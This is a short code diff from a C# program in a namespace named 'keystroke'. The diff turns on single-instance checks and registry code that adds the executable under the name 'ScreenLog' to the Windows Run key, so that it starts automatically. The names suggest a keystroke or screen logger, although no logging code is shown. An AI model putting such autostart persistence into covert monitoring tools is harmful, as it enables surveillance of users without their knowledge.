@@ -37,24 +37,26 @@ namespace keystroke
         [STAThread]
         static void Main()
         {
-            //String thisprocessname = Process.GetCurrentProcess().ProcessName;
+            String thisprocessname = Process.GetCurrentProcess().ProcessName;
 
-            //if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
-            //    return;
+            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
+                return;
 
 
             try
             {
-                //RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
-                //object currentValue = read.GetValue("ScreenLog");
+                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+                object currentValue = read.GetValue("ScreenLog");
 
-                //string val = currentValue.ToString();
-                //string exe_path = Application.ExecutablePath;
-                //if (currentValue == null || val != exe_path)
-                //{
-                //    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                //    add.SetValue("ScreenLog", Application.ExecutablePath);
-                //}
+                string val = "";
+                if( currentValue != null )
+                    val = currentValue.ToString();
+                string exe_path = Application.ExecutablePath;
+                if (currentValue == null || val != exe_path)
+                {
+                    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    add.SetValue("ScreenLog", Application.ExecutablePath);
+                }
 
                 //if (currentValue == null || String.Compare(val, Application.ExecutablePath, true) != 0)
                 //{
